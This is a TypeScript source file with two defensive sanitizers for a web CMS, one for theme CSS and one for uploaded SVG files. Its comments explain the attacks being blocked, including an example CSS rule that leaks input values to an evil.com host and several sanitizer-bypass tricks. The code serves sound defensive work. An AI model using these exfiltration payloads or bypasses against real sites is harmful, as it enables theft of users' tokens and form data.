/**
 * Sanitizes theme CSS before it's stored and injected into every public page's <head>
 * (see server/plugins/theme-resolver.ts). Theme CSS is purely declarative styling —
 * colors, spacing, typography via CSS custom properties — and never legitimately needs
 * to load external resources (fonts/images are handled through dedicated site settings,
 * not theme CSS). So `url()` and `@import` are stripped entirely rather than allow-listed.
 *
 * This closes the CSS attribute-selector exfiltration technique — e.g.
 * `input[value^="a"] { background: url(https://evil.com/?leak=a) }`, which can leak DOM
 * attribute values (tokens, form state) character-by-character to an attacker's server
 * purely from CSS matching, no JavaScript required — plus @import-based external
 * stylesheet loading and the legacy IE `expression()` code-execution vector.
 */
// CSS lets any character be escaped as `\` + 1-6 hex digits (+ one optional trailing
// whitespace) or `\` + the literal character itself, and browsers decode these during
// tokenizing — so `\75rl(...)` parses identically to `url(...)`, and `@\69mport`
// identically to `@import`. Decoding escapes before the literal-text strips below closes
// that bypass; run this first so a payload can't use escapes to also hide/split a
// dangerous construct across a comment the way `sanitizeThemeCss` already guards against
// for the unescaped case.
function decodeCssEscapes(css: string): string {
  return css.replace(/\\([0-9a-f]{1,6})[ \t\n\r\f]?|\\([\s\S])/gi, (_match, hex: string | undefined, lit: string | undefined) => {
    if (hex !== undefined) {
      const codePoint = Number.parseInt(hex, 16)
      if (Number.isNaN(codePoint) || codePoint > 0x10FFFF) return ''
      try {
        return String.fromCodePoint(codePoint)
      } catch {
        return ''
      }
    }
    return lit ?? ''
  })
}

export function sanitizeThemeCss(css: string): string {
  let out = decodeCssEscapes(css)
  // Strip comments first so a payload can't hide/split a dangerous construct across
  // one (e.g. "@im/* */port").
  out = out.replace(/\/\*[\s\S]*?\*\//g, '')
  // Strip @import (external stylesheet loading). Matches through the first semicolon;
  // over-consuming on malformed input (missing semicolon) fails closed, not open.
  out = out.replace(/@import\b[^;]*;?/gi, '')
  // Strip url(...) entirely everywhere it appears. Quoted alternatives are tried first
  // so a data: URI containing a literal ')' inside its quotes (routine for inline SVG —
  // transform functions, path data) is consumed in full; a naive `[^)]*` stops at that
  // first embedded ')', replaces only the partial match, and leaves the real remainder
  // of the value (including the true closing ')' and trailing ';') as unescaped garbage
  // text in the stylesheet, corrupting parsing from that point on. Each alternative is a
  // fully self-contained url(...)/expression(...) pattern (not a shared `\s*` suffix
  // outside the alternation) — a shared trailing quantifier that can also be satisfied by
  // the fallback branch is exactly the overlapping-repetition shape that enables
  // super-linear regex backtracking on malformed input.
  out = out.replace(/url\s*\(\s*"[^"]*"\s*\)|url\s*\(\s*'[^']*'\s*\)|url\s*\([^)]*\)/gi, 'none')
  // image-set()/-webkit-image-set()/cross-fade()/-webkit-cross-fade() also resolve to an
  // external image reference (per the CSS Images spec) but take a bare quoted string
  // instead of url(...), so they carry the exact same attribute-selector exfiltration risk
  // this function exists to close without ever containing the substring "url(" — a
  // documented real-world sanitizer bypass technique (used against webmail CSS sanitizers).
  // Same quoted-string-first matching as url()/expression() above, for the same reason.
  out = out.replace(/-?(?:webkit-)?(?:image-set|cross-fade)\s*\(\s*"[^"]*"\s*\)|-?(?:webkit-)?(?:image-set|cross-fade)\s*\(\s*'[^']*'\s*\)|-?(?:webkit-)?(?:image-set|cross-fade)\s*\([^)]*\)/gi, 'none')
  // Strip legacy IE CSS expression() (arbitrary script execution in old IE) — same
  // quoted-string-aware matching, since its argument is a JS-like expression that may
  // itself contain a quoted string with a ')' inside.
  out = out.replace(/\bexpression\s*\(\s*"[^"]*"\s*\)|\bexpression\s*\(\s*'[^']*'\s*\)|\bexpression\s*\([^)]*\)/gi, 'none')
  // Prevent breaking out of the <style> block it's injected into.
  out = out.replace(/<\/style>/gi, '')
  return out
}

/**
 * Strips script-execution vectors from an uploaded SVG before it's stored and served back
 * with its own (attacker-influenced but allowlisted) `image/svg+xml` content-type — SVG is
 * XML that can carry <script>, event-handler attributes, and javascript:-scheme hrefs, all
 * of which execute when the file is opened directly (e.g. a media library's public URL,
 * navigated to on its own rather than embedded via <img>). Kept alongside the SVG-specific
 * pieces of the media MIME-type allowlist in upload.post.ts, since SVG is the one image
 * format on that allowlist that isn't otherwise script-inert. Strip-based like
 * sanitizeThemeCss above, for the same reason: this is a small, fixed set of known vectors,
 * not general-purpose HTML/SVG rendering.
 */
export function sanitizeSvg(svg: string): string {
  let out = svg
  out = out.replace(/<script[\s\S]*?<\/script\s*>/gi, '')
  out = out.replace(/<script\b[^>]*\/>/gi, '')
  // <foreignObject> lets SVG embed arbitrary HTML (including its own <script>) — no
  // legitimate use case for a media-library-uploaded SVG, so it's dropped outright.
  out = out.replace(/<foreignObject[\s\S]*?<\/foreignObject\s*>/gi, '')
  // Event-handler attributes (onload, onclick, onerror, ...), any quoting style.
  out = out.replace(/\son\w+\s*=\s*"[^"]*"/gi, '')
  out = out.replace(/\son\w+\s*=\s*'[^']*'/gi, '')
  out = out.replace(/\son\w+\s*=\s*[^\s>]+/gi, '')
  // javascript:/vbscript: hrefs (href or xlink:href) — replaced, not removed, so the
  // attribute stays well-formed XML.
  out = out.replace(/((?:xlink:)?href\s*=\s*)"\s*(?:javascript|vbscript):[^"]*"/gi, '$1"#"')
  out = out.replace(/((?:xlink:)?href\s*=\s*)'\s*(?:javascript|vbscript):[^']*'/gi, '$1\'#\'')
  return out
}
